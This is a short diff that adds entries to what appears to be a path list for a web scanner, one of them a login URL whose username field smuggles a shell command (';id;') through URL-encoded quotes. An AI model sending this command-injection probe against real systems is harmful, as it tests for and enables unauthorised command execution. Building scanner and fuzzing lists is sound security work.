@@ -11,3 +11,5 @@
 
 /webstation/
 /api/project
+/
+/cgi-bin/login.lua?action=login&password=x&username=%22;id;echo%20%22
